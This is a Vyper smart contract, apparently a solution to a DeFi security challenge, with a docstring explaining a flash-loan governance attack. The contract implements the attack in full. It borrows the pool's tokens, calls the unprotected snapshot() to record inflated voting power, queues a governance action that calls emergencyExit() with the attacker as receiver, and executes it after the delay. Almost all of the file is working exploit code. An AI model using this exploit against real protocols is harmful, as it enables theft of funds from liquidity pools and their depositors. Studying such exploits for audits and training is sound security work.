# @version ^0.3.7

"""
The vulnerability is that anyone can call `snapshot()`
on the token contract. An attacker can take a flash loan 
and call `snapshot()` so they can have their inflated token 
balance recorded. They can then call `queueAction()` on the 
governance contract, which checks if the sender has enough voting
power by checking their balance at the last snapshot. Since the 
attacker called `snapshot()` after they took out a flash loan, they 
will pass this check. They can specify the target of the action to 
be the flash loan pool and the data will be the calldata required to 
call the priviledged `emergencyExit()` function in the flash loan pool 
contract. This function has an onlyGovernance modifier and since the 
governance contract will call this function when the attacker calls `executeAction()`,
after waiting the action delay period, the attacker has successfuly called the 
`emergencyExit()` function with the receiver address being which ever address they 
speicified in their malicious calldata.
"""

from vyper.interfaces import ERC20 as IERC20

interface IGovernance:
    def getActionDelay() -> uint256: view
    def queueAction(
        _target: address,
        _value: uint128,
        _data: Bytes[36],
    ) -> uint256: nonpayable
    def executeAction(actionId: uint256): payable

owner: immutable(address)

governance: IGovernance

pool: address
token: address

action_id: uint256
time_proposed: uint256

@external
@payable
def __init__(_governance: IGovernance, _pool: address, _token: address):
    owner = msg.sender
    self.governance = _governance
    self.pool = _pool
    self.token = _token

@external
def start_attack():
    assert msg.sender == owner, "!owner"
    pool: address = self.pool
    token: address = self.token
    data: Bytes[64] = _abi_encode(pool, token)
    raw_call(
        pool,
        _abi_encode(
            self,
            token,
            IERC20(token).balanceOf(pool),
            data,
            method_id=method_id("flashLoan(address,address,uint256,bytes)"),
        )
    )

@external
def finish_attack():
    assert msg.sender == owner, "!owner"
    assert block.timestamp - self.time_proposed >= self.governance.getActionDelay(), "!time"
    self.governance.executeAction(self.action_id)

@external
def onFlashLoan(
    _initiator: address,
    _token: address,
    _amount: uint256, 
    _fee: uint256,
    _data: Bytes[64],
) -> bytes32:
    pool: address = empty(address)
    token: address = empty(address)
    pool, token = _abi_decode(_data, (address,address))
    assert msg.sender == pool, "!pool"
    assert _initiator == self, "!initiator"
    assert _token == token, "!token"
    # take snapshot
    raw_call(token, method_id("snapshot()"))
    # manipulate governance
    data: Bytes[36] = _abi_encode(
        owner,
        method_id=method_id("emergencyExit(address)"),
    )
    self.action_id = self.governance.queueAction(pool, 0, data)
    self.time_proposed = block.timestamp
    # approve pool for repayment
    IERC20(token).approve(pool, _amount)
    # return hash for successful callback
    return keccak256("ERC3156FlashBorrower.onFlashLoan")
